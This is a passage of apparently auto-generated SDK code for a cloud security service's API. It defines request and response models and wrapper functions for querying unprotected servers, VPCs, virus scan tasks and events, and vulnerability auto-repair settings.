*   **TRIPARTITE**: a lightweight server', example='ALIYUN'),
    }
  ](name='MachineList', description='An array that consists of the information about servers.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model ListUninstallAegisMachinesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListUninstallAegisMachinesResponseBody(name='body'),
}

/**
 * @summary Queries the information about the servers whose Security Center agent is not installed.
 *
 * @param request ListUninstallAegisMachinesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListUninstallAegisMachinesResponse
 */
async function listUninstallAegisMachinesWithOptions(request: ListUninstallAegisMachinesRequest, runtime: Util.RuntimeOptions): ListUninstallAegisMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdStr)) {
    query['RegionIdStr'] = request.regionIdStr;
  }
  if (!Util.isUnset(request.regionNo)) {
    query['RegionNo'] = request.regionNo;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUninstallAegisMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the servers whose Security Center agent is not installed.
 *
 * @param request ListUninstallAegisMachinesRequest
 * @return ListUninstallAegisMachinesResponse
 */
async function listUninstallAegisMachines(request: ListUninstallAegisMachinesRequest): ListUninstallAegisMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUninstallAegisMachinesWithOptions(request, runtime);
}

model ListUserVpcRequest {
  k8sRegionId?: string(name='K8sRegionId', description='Region.

This parameter is required.', example='cn-hangzhou'),
}

model ListUserVpcResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is a unique identifier generated by Alibaba Cloud for this request and can be used to troubleshoot and locate issues.', example='A3D7C47D-3F11-57BB-90E8-E5C20C619F37'),
  userVpcInfos?: [ 
    {
      cidrBlock?: string(name='CidrBlock', description='IPv4 network segment of the VPC.', example='192.168.XXX.XXX/16'),
      creationTime?: string(name='CreationTime', description='Creation time.', example='2023-03-30T07:16:02Z'),
      default?: boolean(name='Default', description='Indicates whether it is the default VPC in the region. Values:
- **true**: Yes - **false**: No', example='true'),
      description?: string(name='Description', description='Description of the VPC.', example='This is my VPC.'),
      modifyTime?: string(name='ModifyTime', description='Modification time.', example='2023-03-30T07:16:02Z'),
      regionId?: string(name='RegionId', description='Region', example='cn-hangzhou'),
      status?: string(name='Status', description='Status of the VPC. Values:

- **Pending**: Configuring
- **Available**: Available', example='Available'),
      VRouterId?: string(name='VRouterId', description='ID of the VPC router.', example='vrt-bp1jcg5cmxjbl9xgc****'),
      vpcId?: string(name='VpcId', description='ID of the VPC.', example='vpc-bp1qpo0kug3a20qqe****'),
      vpcName?: string(name='VpcName', description='Name of the VPC.', example='Vpc-1'),
    }
  ](name='UserVpcInfos', description='List of VPC information.'),
}

model ListUserVpcResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListUserVpcResponseBody(name='body'),
}

/**
 * @summary Get VPC Data
 *
 * @param request ListUserVpcRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListUserVpcResponse
 */
async function listUserVpcWithOptions(request: ListUserVpcRequest, runtime: Util.RuntimeOptions): ListUserVpcResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.k8sRegionId)) {
    query['K8sRegionId'] = request.k8sRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUserVpc',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get VPC Data
 *
 * @param request ListUserVpcRequest
 * @return ListUserVpcResponse
 */
async function listUserVpc(request: ListUserVpcRequest): ListUserVpcResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUserVpcWithOptions(request, runtime);
}

model ListUuidsByAppIdRequest {
  appId?: string(name='AppId', description='SAE application ID.', example='5b41f4bf-349f-4263-89b1-9234c034****'),
  appRegionId?: string(name='AppRegionId', description='Region ID.', example='cn-hangzhou'),
  currentPage?: int32(name='CurrentPage', description='The page number to display in a paginated query.', example='1'),
  lang?: string(name='Lang', description='The language type for request and response, default is **zh**. Values:
- **zh**: Chinese
- **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of items to display per page in a paginated query.', example='20'),
  resourceDirectoryUid?: long(name='ResourceDirectoryUid', description='Resource associated directory UID.', example='123456'),
}

model ListUuidsByAppIdResponseBody = {
  count?: int32(name='Count', description='Total number of data entries.', example='1'),
  requestId?: string(name='RequestId', description='The ID of this call request, a unique identifier generated by Alibaba Cloud for the request, which can be used to troubleshoot and pinpoint issues.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8E****'),
  uuids?: [ string ](name='Uuids', description='List of UUIDs.'),
}

model ListUuidsByAppIdResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListUuidsByAppIdResponseBody(name='body'),
}

/**
 * @summary Query the list of instance UUIDs based on the application ID.
 *
 * @param request ListUuidsByAppIdRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListUuidsByAppIdResponse
 */
async function listUuidsByAppIdWithOptions(request: ListUuidsByAppIdRequest, runtime: Util.RuntimeOptions): ListUuidsByAppIdResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appId)) {
    query['AppId'] = request.appId;
  }
  if (!Util.isUnset(request.appRegionId)) {
    query['AppRegionId'] = request.appRegionId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceDirectoryUid)) {
    query['ResourceDirectoryUid'] = request.resourceDirectoryUid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUuidsByAppId',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query the list of instance UUIDs based on the application ID.
 *
 * @param request ListUuidsByAppIdRequest
 * @return ListUuidsByAppIdResponse
 */
async function listUuidsByAppId(request: ListUuidsByAppIdRequest): ListUuidsByAppIdResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUuidsByAppIdWithOptions(request, runtime);
}

model ListUuidsByWebPathRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

This parameter is required.', example='20'),
  type?: string(name='Type', description='The path type of the web directory. Valid values:

*   **def**: automatically identified
*   **customize**: manually added', example='def'),
  webPath?: string(name='WebPath', description='The path to the web directory.', example='/root/www****'),
}

model ListUuidsByWebPathResponseBody = {
  list?: [ 
    {
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      machineName?: string(name='MachineName', description='The name of the server.', example='test****'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='An array that consists of the protected assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='10'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A3C1240F-9DAC-5EE8-ADF5-2F930A95****'),
}

model ListUuidsByWebPathResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListUuidsByWebPathResponseBody(name='body'),
}

/**
 * @summary Queries protected assets by using the paths to specific web directories.
 *
 * @param request ListUuidsByWebPathRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListUuidsByWebPathResponse
 */
async function listUuidsByWebPathWithOptions(request: ListUuidsByWebPathRequest, runtime: Util.RuntimeOptions): ListUuidsByWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.webPath)) {
    query['WebPath'] = request.webPath;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUuidsByWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries protected assets by using the paths to specific web directories.
 *
 * @param request ListUuidsByWebPathRequest
 * @return ListUuidsByWebPathResponse
 */
async function listUuidsByWebPath(request: ListUuidsByWebPathRequest): ListUuidsByWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUuidsByWebPathWithOptions(request, runtime);
}

model ListVirusScanMachineRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
  remark?: string(name='Remark', description='The information about the server that you want to query. The value can be the name or the IP address of the server.', example='192.168.1****'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='7cc91747-2845-40d4-bb69-c077597f****'),
}

model ListVirusScanMachineResponseBody = {
  data?: [ 
    {
      eventCount?: int32(name='EventCount', description='The number of times that the alert is triggered.', example='28'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-bp180bogui4fc0z4****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='centos****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the associated server.', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the associated server.', example='10.42.XX.XX'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='The returned data.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='168'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A27C1C09-828B-5CB8-9203-F55423BE****'),
}

model ListVirusScanMachineResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListVirusScanMachineResponseBody(name='body'),
}

/**
 * @summary Queries servers on which virus detection and removal tasks are performed.
 *
 * @param request ListVirusScanMachineRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListVirusScanMachineResponse
 */
async function listVirusScanMachineWithOptions(request: ListVirusScanMachineRequest, runtime: Util.RuntimeOptions): ListVirusScanMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListVirusScanMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries servers on which virus detection and removal tasks are performed.
 *
 * @param request ListVirusScanMachineRequest
 * @return ListVirusScanMachineResponse
 */
async function listVirusScanMachine(request: ListVirusScanMachineRequest): ListVirusScanMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return listVirusScanMachineWithOptions(request, runtime);
}

model ListVirusScanMachineEventRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.

This parameter is required.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  operateTaskId?: string(name='OperateTaskId', description='The task ID that is generated by the handling operation.

>  You can call the [OperateVirusEvents](~~OperateVirusEvents~~) operation to handle alerts. You can obtain the task ID from the response parameters.', example='233886xx'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='a6931624-c43e-4323-9128-a6be6ffdxxxx'),
}

model ListVirusScanMachineEventResponseBody = {
  data?: [ 
    {
      details?: [ 
        {
          infoType?: string(name='InfoType', description='The display type of the value for ValueDisplay. Valid value:

*   **download_url**, which indicates a download URL.', example='download_url'),
          nameDisplay?: string(name='NameDisplay', description='The display name of the alert event.', example='Trojan Path'),
          type?: string(name='Type', description='The format in which the details of the exception are displayed.

Valid values:

*   **text**
*   **html**', example='html'),
          valueDisplay?: string(name='ValueDisplay', description='The attribute information about the exception. The information includes the logon time or location of an alert triggered by an unusual logon, and the trojan file path or trojan type of an alert.', example='getopt'),
        }
      ](name='Details', description='The details of the exception.'),
      eventId?: long(name='EventId', description='The ID of the alert event.', example='911273'),
      eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Unusual Logon'),
      instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
      internetIp?: string(name='InternetIp', description='The public IP address.', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='10.42.XX.XX'),
      lastTimeStamp?: long(name='LastTimeStamp', description='The timestamp when the alert event was last generated. Unit: milliseconds.', example='1682046733628'),
      level?: string(name='Level', description='The risk level of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
    }
  ](name='Data', description='The details of the alert event.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='2DAEF40F-8E1A-550D-8793-99C61C401DD0'),
}

model ListVirusScanMachineEventResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListVirusScanMachineEventResponseBody(name='body'),
}

/**
 * @summary Queries the alert events that are generated for viruses detected on a server.
 *
 * @param request ListVirusScanMachineEventRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListVirusScanMachineEventResponse
 */
async function listVirusScanMachineEventWithOptions(request: ListVirusScanMachineEventRequest, runtime: Util.RuntimeOptions): ListVirusScanMachineEventResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operateTaskId)) {
    query['OperateTaskId'] = request.operateTaskId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListVirusScanMachineEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the alert events that are generated for viruses detected on a server.
 *
 * @param request ListVirusScanMachineEventRequest
 * @return ListVirusScanMachineEventResponse
 */
async function listVirusScanMachineEvent(request: ListVirusScanMachineEventRequest): ListVirusScanMachineEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return listVirusScanMachineEventWithOptions(request, runtime);
}

model ListVirusScanTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  endTime?: long(name='EndTime', description='The timestamp when the virus scan task ended. Unit: milliseconds.', example='1680919232999'),
  internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.27.XX.XX'),
  intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.26.XX.XX'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  machineName?: string(name='MachineName', description='The name of the server.', example='oracle-win-001****'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='20'),
  rootTask?: boolean(name='RootTask', description='Specifies whether the virus scan task is the root task.', example='true'),
  rootTaskId?: string(name='RootTaskId', description='The ID of the root task.

>  You can call the [GetVirusScanLatestTaskStatistic](~~GetVirusScanLatestTaskStatistic~~) operation to query the ID.', example='89f5d7813bd59dd237580a8664b3xxxx'),
  scanType?: string(name='ScanType', description='The type of the virus scan task. Valid values:

*   **system**: automatic scan task
*   **user**: custom scan task', example='user'),
  startTime?: long(name='StartTime', description='The timestamp when the virus scan task started. Unit: milliseconds.', example='1680919232000'),
  status?: int32(name='Status', description='The status of the virus scan task. Valid values:

*   **1**: running
*   **2**: complete
*   **3**: failed
*   **4**: timed out', example='1'),
  statusList?: [ int32 ](name='StatusList', description='The statuses of virus scan tasks.'),
  taskId?: string(name='TaskId', description='The ID of the virus scan task.

>  You can call the [ListVirusScanTask](~~ListVirusScanTask~~) operation to query the ID.', example='1471d8ebb96795b41ede090b9758****'),
}

model ListVirusScanTaskResponseBody = {
  list?: [ 
    {
      endTime?: long(name='EndTime', description='The timestamp when the virus scan task ended. Unit: milliseconds.', example='1662343860051'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      progress?: int32(name='Progress', description='The progress of the task in percentage.', example='62'),
      scanPath?: [ string ](name='ScanPath', description='The information about the file that is scanned.'),
      scanType?: string(name='ScanType', description='The type of the virus scan task. Valid values:

*   **system**: automatic scan task
*   **user**: custom scan task', example='system'),
      startTime?: long(name='StartTime', description='The timestamp when the virus scan task started. Unit: milliseconds.', example='1651290987000'),
      status?: int32(name='Status', description='The status of the virus scan task. Valid values:

*   **1**: running
*   **2**: complete
*   **3**: failed
*   **4**: timed out', example='1'),
      taskId?: string(name='TaskId', description='The ID of the virus scan task.', example='2e75557bfa570381f5c516cad9b6xxxx'),
      taskName?: string(name='TaskName', description='The name of the virus scan task.

*   The value is fixed as **VIRUS_VUL_SCHEDULE_SCAN**, which indicates a virus scan task.', example='VIRUS_VUL_SCHEDULE_SCAN'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='The returned virus scan tasks.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='224'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model ListVirusScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListVirusScanTaskResponseBody(name='body'),
}

/**
 * @summary Queries virus scan tasks based on conditions such as the task type, task status, and server information.
 *
 * @param request ListVirusScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListVirusScanTaskResponse
 */
async function listVirusScanTaskWithOptions(request: ListVirusScanTaskRequest, runtime: Util.RuntimeOptions): ListVirusScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.internetIp)) {
    query['InternetIp'] = request.internetIp;
  }
  if (!Util.isUnset(request.intranetIp)) {
    query['IntranetIp'] = request.intranetIp;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineName)) {
    query['MachineName'] = request.machineName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.rootTask)) {
    query['RootTask'] = request.rootTask;
  }
  if (!Util.isUnset(request.rootTaskId)) {
    query['RootTaskId'] = request.rootTaskId;
  }
  if (!Util.isUnset(request.scanType)) {
    query['ScanType'] = request.scanType;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListVirusScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries virus scan tasks based on conditions such as the task type, task status, and server information.
 *
 * @param request ListVirusScanTaskRequest
 * @return ListVirusScanTaskResponse
 */
async function listVirusScanTask(request: ListVirusScanTaskRequest): ListVirusScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listVirusScanTaskWithOptions(request, runtime);
}

model ListVulAutoRepairConfigRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**.', example='10'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability', example='cve'),
}

model ListVulAutoRepairConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='success'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='11'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B3F3A90-46A5-4023-A2D8-D68B14262F96'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  vulAutoRepairConfigList?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
      id?: long(name='Id', description='The configuration ID of the vulnerability.', example='37338'),
      name?: string(name='Name', description='The name of the vulnerability.', example='anolisos:8.4:ANSA-2022:0001'),
      reason?: string(name='Reason', description='The reason why the vulnerability can be automatically fixed.', example='The vulnerability fix is risk-free and can be configured to automate the fix.'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability', example='cve'),
    }
  ](name='VulAutoRepairConfigList', description='An array consisting of the existing configurations of vulnerabilities that can be automatically fixed.'),
}

model ListVulAutoRepairConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListVulAutoRepairConfigResponseBody(name='body'),
}

/**
 * @summary Queries the existing configurations of vulnerabilities that can be automatically fixed.
 *
 * @param request ListVulAutoRepairConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListVulAutoRepairConfigResponse
 */
async function listVulAutoRepairConfigWithOptions(request: ListVulAutoRepairConfigRequest, runtime: Util.RuntimeOptions): ListVulAutoRepairConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListVulAutoRepairConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the existing configurations of vulnerabilities that can be automatically fixed.
 *
 * @param request ListVulAutoRepairConfigRequest
 * @return ListVulAutoRepairConfigResponse
 */
async function listVulAutoRepairConfig(request: ListVulAutoRepairConfigRequest): ListVulAutoRepairConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listVulAutoRepairConfigWithOptions(request, runtime);
}

model ListVulGlobalConfigRequest {
  configKey?: string(name='ConfigKey', description='The key of the configuration item. Valid values:

*   **vul_scan_ip_list**: The IP addresses that are detected.', example='vul_scan_ip_list'),
}

model ListVulGlobalConfigResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  vulGlobalConfigList?: [ 
    {
      configKey?: string(name='ConfigKey', description='The key of the configuration item.', example='vul_scan_ip_list'),
      configValue?: string(name='ConfigValue', description='The value of the configuration item.', example='127.0.*.*,127.0.*.*'),
    }
  ](name='VulGlobalConfigList', description='The configurations.'),
}

model ListVulGlobalConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListVulGlobalConfigResponseBody(name='body'),
}

/**
 * @summary Queries the global configurations of vulnerability detection.
 *
 * @param request ListVulGlobalConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListVulGlobalConfigResponse
 */
async function listVulGlobalConfigWithOptions(request: ListVulGlobalConfigRequest, runtime: Util.RuntimeOptions): ListVulGlobalConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configKey)) {
    query['ConfigKey'] = request.configKey;
